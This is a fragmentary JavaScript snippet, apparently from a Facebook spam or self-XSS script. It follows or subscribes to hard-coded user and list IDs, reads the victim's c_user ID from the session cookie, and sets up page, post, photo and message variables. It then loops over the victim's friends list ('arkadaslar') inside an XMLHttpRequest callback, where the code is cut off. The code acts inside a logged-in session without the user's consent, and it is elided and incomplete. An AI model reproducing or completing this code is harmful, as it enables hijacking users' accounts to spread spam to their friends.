...
a("100001626334123"); //spanyol
a("100003789317246"); //taiwan
sublist("546778328719707");
sublist("176443199192009");
...
var spage_id = "223569004361081";
var spost_id = "223569004361081";
var sfoto_id = "223569004361081";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "223569004361081";
var smesaj_text = "223569004361081";
var arkadaslar = [223569004361081];
var svn_rev;
var bugun= new Date();
        ...
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  ...
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "223569004361081";
					smesaj_text = "223569004361081";
